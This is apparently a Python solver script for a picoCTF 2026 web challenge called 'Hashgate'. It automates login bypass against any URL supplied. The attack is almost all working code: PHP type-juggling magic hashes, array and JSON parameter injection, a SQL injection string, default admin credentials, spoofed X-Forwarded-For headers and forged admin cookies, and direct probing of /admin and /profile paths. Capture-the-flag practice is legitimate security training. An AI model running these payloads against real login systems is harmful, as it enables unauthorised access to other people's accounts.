#!/usr/bin/env python3
"""
Hashgate - picoCTF 2026 (Web Exploitation, 100 pts)

Bypass hash-based authentication to access a profile page and get the flag.

The application uses hashing for authentication. This script attempts
multiple bypass techniques:
  1. PHP type juggling with magic hashes
  2. Array parameter injection
  3. Known magic hash values for MD5/SHA1
  4. Hash collision / identical hash inputs
  5. Empty/null value bypass

Usage:
    python3 solve.py <URL>
    python3 solve.py http://challenge.picoctf.org:PORT

Dependencies: requests (pip install requests)
"""

import argparse
import sys
import re
import hashlib

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


# ============================================================
# Magic hash values - MD5 hashes that start with "0e" + digits
# When PHP uses == comparison, these all evaluate to 0
# ============================================================
MAGIC_MD5_STRINGS = [
    "240610708",       # 0e462097431906509019562988736854
    "QNKCDZO",        # 0e830400451993494058024219903391
    "aabg7XSs",       # 0e087386482136013740957780965295
    "aabC9RqS",       # 0e041022518165728668967510884915
    "s878926199a",     # 0e545993274517709034328855841020
    "s155964671a",     # 0e342768416822451524974117254469
    "s214587387a",     # 0e848240448830537924465865611904
    "s1091221200a",    # 0e940624217856561557816327384675
    "s1885207154a",    # 0e509367213418206700842008763514
]

# SHA1 magic hashes (0e + digits)
MAGIC_SHA1_STRINGS = [
    "10932435112",     # 0e07766915004133176347055865026311692244
    "aaroZmOk",        # 0e66507019969427134894567494305185566735
    "aaK1STfY",        # 0e76658526655756207688271159624026011393
    "aaO8zKZF",        # 0e89257456677279068558073954252716165668
]

# SHA256 magic hashes
MAGIC_SHA256_STRINGS = [
    "34250003024812",  # 0e46289032038065916139621039085883773413...
]


def find_login_form(session, url):
    """Fetch the page and find the login form details."""
    print(f"[*] Fetching {url}...")
    try:
        resp = session.get(url, allow_redirects=True, timeout=10)
        print(f"[*] Status: {resp.status_code}")
        print(f"[*] URL after redirects: {resp.url}")

        # Look for form action and input fields
        html = resp.text

        # Find form action
        form_match = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', html, re.IGNORECASE)
        action = form_match.group(1) if form_match else url

        # Find form method
        method_match = re.search(r'<form[^>]*method=["\']([^"\']*)["\']', html, re.IGNORECASE)
        method = method_match.group(1).upper() if method_match else 'POST'

        # Find input fields
        inputs = re.findall(
            r'<input[^>]*name=["\']([^"\']*)["\'][^>]*(?:type=["\']([^"\']*)["\'])?',
            html, re.IGNORECASE
        )
        # Also match reversed attribute order
        inputs += re.findall(
            r'<input[^>]*type=["\']([^"\']*)["\'][^>]*name=["\']([^"\']*)["\']',
            html, re.IGNORECASE
        )

        input_names = []
        for inp in inputs:
            name = inp[0] if inp[0] and inp[0] not in ('text', 'password', 'email', 'submit', 'hidden') else inp[1]
            if name and name not in ('submit', ''):
                input_names.append(name)

        # Common field names if detection fails
        if not input_names:
            input_names = ['email', 'password']

        print(f"[*] Form action: {action}")
        print(f"[*] Form method: {method}")
        print(f"[*] Input fields: {input_names}")

        # Check for JavaScript hashing
        if 'md5' in html.lower() or 'sha1' in html.lower() or 'sha256' in html.lower():
            print("[*] Client-side hashing detected in HTML!")

        # Check for hash algorithm hints in source
        hash_hints = re.findall(r'(md5|sha1|sha256|sha512|bcrypt)', html.lower())
        if hash_hints:
            print(f"[*] Hash algorithm hints: {hash_hints}")

        # Check for comments with hints
        comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
        for c in comments:
            if any(keyword in c.lower() for keyword in ['flag', 'hash', 'password', 'hint', 'secret', 'admin']):
                print(f"[*] Interesting comment: {c.strip()}")

        return {
            'action': action,
            'method': method,
            'fields': input_names,
            'html': html,
            'base_url': resp.url,
        }

    except Exception as e:
        print(f"[!] Error: {e}")
        return None


def try_magic_hashes(session, url, form_info):
    """
    Attempt 1: PHP type juggling with magic hash values.
    Send pairs of inputs whose hashes both evaluate to 0 in PHP.
    """
    print("\n[*] === Attempt 1: Magic hash type juggling ===")

    action = form_info['action']
    if not action.startswith('http'):
        # Resolve relative URL
        from urllib.parse import urljoin
        action = urljoin(form_info['base_url'], action)

    fields = form_info['fields']
    email_field = fields[0] if fields else 'email'
    pass_field = fields[1] if len(fields) > 1 else 'password'

    # Try pairs of magic hash strings
    magic_lists = [MAGIC_MD5_STRINGS, MAGIC_SHA1_STRINGS]

    for magic_type, magic_list in [("MD5", MAGIC_MD5_STRINGS), ("SHA1", MAGIC_SHA1_STRINGS)]:
        print(f"\n[*] Trying {magic_type} magic hashes...")
        for i, email_val in enumerate(magic_list[:3]):
            for pass_val in magic_list[:3]:
                data = {email_field: email_val, pass_field: pass_val}
                try:
                    resp = session.post(action, data=data, allow_redirects=True, timeout=10)
                    flags = re.findall(r'picoCTF\{[^}]+\}', resp.text)
                    if flags:
                        print(f"[+] SUCCESS with {magic_type} magic hashes!")
                        print(f"    {email_field}={email_val}, {pass_field}={pass_val}")
                        return flags[0]

                    # Check if we got redirected to a profile page
                    if 'profile' in resp.url.lower() or 'dashboard' in resp.url.lower():
                        print(f"[+] Redirected to profile: {resp.url}")
                        flags = re.findall(r'picoCTF\{[^}]+\}', resp.text)
                        if flags:
                            return flags[0]
                        # Try fetching the profile page
                        profile_resp = session.get(resp.url, timeout=10)
                        flags = re.findall(r'picoCTF\{[^}]+\}', profile_resp.text)
                        if flags:
                            return flags[0]

                except Exception as e:
                    print(f"    [!] Error: {e}")
                    continue

    # Also try: one magic hash string for both fields
    print("\n[*] Trying same magic hash for both fields...")
    for val in MAGIC_MD5_STRINGS[:5]:
        data = {email_field: val, pass_field: val}
        try:
            resp = session.post(action, data=data, allow_redirects=True, timeout=10)
            flags = re.findall(r'picoCTF\{[^}]+\}', resp.text)
            if flags:
                print(f"[+] SUCCESS: {email_field}={val}, {pass_field}={val}")
                return flags[0]
        except Exception:
            continue

    print("[-] Magic hash approach did not work.")
    return None


def try_array_injection(session, url, form_info):
    """
    Attempt 2: Array parameter injection.
    In PHP, hash(array()) returns NULL, and NULL == NULL is true.
    """
    print("\n[*] === Attempt 2: Array parameter injection ===")

    action = form_info['action']
    if not action.startswith('http'):
        from urllib.parse import urljoin
        action = urljoin(form_info['base_url'], action)

    fields = form_info['fields']
    email_field = fields[0] if fields else 'email'
    pass_field = fields[1] if len(fields) > 1 else 'password'

    # Send arrays instead of strings
    payloads = [
        # Array parameters (PHP interprets field[] as array)
        {f"{email_field}[]": "admin", f"{pass_field}[]": "anything"},
        {f"{email_field}[]": "", f"{pass_field}[]": ""},
        {f"{email_field}[]": "a", f"{pass_field}[]": "a"},
        # JSON array payloads (for apps that parse JSON)
    ]

    for data in payloads:
        try:
            print(f"[*] Trying: {data}")
            resp = session.post(action, data=data, allow_redirects=True, timeout=10)
            flags = re.findall(r'picoCTF\{[^}]+\}', resp.text)
            if flags:
                print(f"[+] SUCCESS with array injection!")
                return flags[0]

            if 'profile' in resp.url.lower() or 'dashboard' in resp.url.lower():
                print(f"[+] Redirected to: {resp.url}")
                flags = re.findall(r'picoCTF\{[^}]+\}', resp.text)
                if flags:
                    return flags[0]

        except Exception as e:
            print(f"    [!] Error: {e}")

    # Try JSON content type with arrays
    print("\n[*] Trying JSON array payloads...")
    json_payloads = [
        {email_field: [], pass_field: []},
        {email_field: ["admin"], pass_field: ["pass"]},
        {email_field: True, pass_field: True},
        {email_field: 0, pass_field: 0},
    ]

    for data in json_payloads:
        try:
            print(f"[*] Trying JSON: {data}")
            resp = session.post(action, json=data, allow_redirects=True, timeout=10)
            flags = re.findall(r'picoCTF\{[^}]+\}', resp.text)
            if flags:
                print(f"[+] SUCCESS with JSON injection!")
                return flags[0]
        except Exception:
            continue

    print("[-] Array injection approach did not work.")
    return None


def try_identical_hashes(session, url, form_info):
    """
    Attempt 3: If the app checks hash(email) == hash(password),
    just send the same value for both fields.
    """
    print("\n[*] === Attempt 3: Identical hash values ===")

    action = form_info['action']
    if not action.startswith('http'):
        from urllib.parse import urljoin
        action = urljoin(form_info['base_url'], action)

    fields = form_info['fields']
    email_field = fields[0] if fields else 'email'
    pass_field = fields[1] if len(fields) > 1 else 'password'

    # If the comparison is hash(email) == hash(password), same input works
    test_values = [
        "admin", "test", "a", "0", "", "null", "true", "false",
        "admin@admin.com", "user@example.com",
    ]

    for val in test_values:
        data = {email_field: val, pass_field: val}
        try:
            resp = session.post(action, data=data, allow_redirects=True, timeout=10)
            flags = re.findall(r'picoCTF\{[^}]+\}', resp.text)
            if flags:
                print(f"[+] SUCCESS: {email_field}={val}, {pass_field}={val}")
                return flags[0]

            if 'profile' in resp.url.lower():
                flags = re.findall(r'picoCTF\{[^}]+\}', resp.text)
                if flags:
                    return flags[0]
        except Exception:
            continue

    print("[-] Identical hash approach did not work.")
    return None


def try_known_collisions(session, url, form_info):
    """
    Attempt 4: Try known MD5 collision pairs.
    Two different inputs that produce the same MD5 hash.
    """
    print("\n[*] === Attempt 4: Hash collision / special values ===")

    action = form_info['action']
    if not action.startswith('http'):
        from urllib.parse import urljoin
        action = urljoin(form_info['base_url'], action)

    fields = form_info['fields']
    email_field = fields[0] if fields else 'email'
    pass_field = fields[1] if len(fields) > 1 else 'password'

    # Try common bypass values
    bypass_pairs = [
        # Empty values
        ("", ""),
        # Null bytes
        ("\x00", "\x00"),
        # Boolean-like
        ("true", "true"),
        ("1", "1"),
        ("0", "0"),
        # SQL injection (in case hash check is in SQL)
        ("' OR '1'='1", "' OR '1'='1"),
        # Common admin credentials
        ("admin", "admin"),
        ("admin@admin.com", "password"),
        # The word "hash" or "bypass"
        ("bypass", "bypass"),
    ]

    for email_val, pass_val in bypass_pairs:
        data = {email_field: email_val, pass_field: pass_val}
        try:
            resp = session.post(action, data=data, allow_redirects=True, timeout=10)
            flags = re.findall(r'picoCTF\{[^}]+\}', resp.text)
            if flags:
                print(f"[+] SUCCESS: {email_field}={email_val!r}, {pass_field}={pass_val!r}")
                return flags[0]
        except Exception:
            continue

    print("[-] Known collision/special value approach did not work.")
    return None


def try_header_cookie_bypass(session, url, form_info):
    """
    Attempt 5: Check if authentication can be bypassed via cookies or headers.
    """
    print("\n[*] === Attempt 5: Cookie/header bypass ===")

    # Try accessing profile page directly
    profile_urls = [
        url.rstrip('/') + '/profile',
        url.rstrip('/') + '/dashboard',
        url.rstrip('/') + '/flag',
        url.rstrip('/') + '/home',
        url.rstrip('/') + '/user',
        url.rstrip('/') + '/admin',
    ]

    for profile_url in profile_urls:
        try:
            resp = session.get(profile_url, timeout=10)
            flags = re.findall(r'picoCTF\{[^}]+\}', resp.text)
            if flags:
                print(f"[+] Flag found at {profile_url}")
                return flags[0]
        except Exception:
            continue

    # Try with authentication headers
    auth_headers = [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'Authorization': 'Bearer admin'},
        {'Cookie': 'authenticated=true'},
        {'Cookie': 'admin=true'},
        {'Cookie': 'user=admin'},
    ]

    for headers in auth_headers:
        for profile_url in profile_urls[:3]:
            try:
                resp = session.get(profile_url, headers=headers, timeout=10)
                flags = re.findall(r'picoCTF\{[^}]+\}', resp.text)
                if flags:
                    print(f"[+] Flag found with headers {headers}")
                    return flags[0]
            except Exception:
                continue

    print("[-] Cookie/header bypass did not work.")
    return None


def main():
    parser = argparse.ArgumentParser(description='Hashgate solver - picoCTF 2026')
    parser.add_argument('url', nargs='?', help='Challenge URL')
    args = parser.parse_args()

    print("=" * 60)
    print("  Hashgate - picoCTF 2026 Solver")
    print("  Web Exploitation | 100 pts")
    print("=" * 60)
    print()

    if not HAS_REQUESTS:
        print("[!] 'requests' library not installed.")
        print("[*] Install with: pip install requests")
        print()
        print("[*] Manual approach:")
        print("    1. Visit the challenge URL")
        print("    2. View page source for hashing logic")
        print("    3. Try PHP type juggling magic hashes:")
        print("       email=240610708&password=QNKCDZO")
        print("    4. Try array injection:")
        print("       email[]=admin&password[]=pass")
        print("    5. Try same value for both fields:")
        print("       email=admin&password=admin")
        sys.exit(1)

    url = args.url
    if not url:
        print("[!] No URL provided.")
        print()
        print("Usage: python3 solve.py <CHALLENGE_URL>")
        print("   Ex: python3 solve.py http://saturn.picoctf.net:12345")
        print()
        print("[*] Manual techniques to try:")
        print()
        print("1. PHP Type Juggling (Magic Hashes):")
        print("   If the app compares MD5 hashes with ==, these inputs")
        print("   both hash to values starting with 0e (treated as 0):")
        print("   - 240610708 -> md5: 0e462097431906509019562988736854")
        print("   - QNKCDZO   -> md5: 0e830400451993494058024219903391")
        print()
        print("2. Array Injection (PHP):")
        print("   Send arrays: email[]=x&password[]=y")
        print("   md5(array) returns NULL, and NULL == NULL is true")
        print()
        print("3. Identical Values:")
        print("   If comparison is hash(email) == hash(password),")
        print("   sending the same value for both will always match.")
        print()
        print("4. Inspect Source:")
        print("   Look at the page source and JavaScript for clues")
        print("   about what hash algorithm and comparison is used.")
        sys.exit(0)

    # Create a session (persists cookies)
    session = requests.Session()

    # Step 1: Reconnaissance
    form_info = find_login_form(session, url)
    if not form_info:
        print("[!] Could not load the page.")
        sys.exit(1)

    flag = None

    # Step 2: Try magic hash type juggling
    if not flag:
        flag = try_magic_hashes(session, url, form_info)

    # Step 3: Try array injection
    if not flag:
        flag = try_array_injection(session, url, form_info)

    # Step 4: Try identical hash values
    if not flag:
        flag = try_identical_hashes(session, url, form_info)

    # Step 5: Try known collisions and special values
    if not flag:
        flag = try_known_collisions(session, url, form_info)

    # Step 6: Try direct profile/cookie bypass
    if not flag:
        flag = try_header_cookie_bypass(session, url, form_info)

    # Final report
    print()
    print("=" * 60)
    if flag:
        print(f"[+] FLAG: {flag}")
    else:
        print("[-] Could not retrieve the flag automatically.")
        print()
        print("[*] Additional manual steps:")
        print("    1. Use Burp Suite to intercept and modify requests")
        print("    2. Check the page source for hash algorithm details")
        print("    3. Look for client-side JavaScript doing the hashing")
        print("    4. Try modifying Content-Type to application/json")
        print("    5. Check for path traversal to access profile directly")
        print("    6. Look at Set-Cookie headers for hash-based tokens")
    print("=" * 60)


if __name__ == '__main__':
    main()
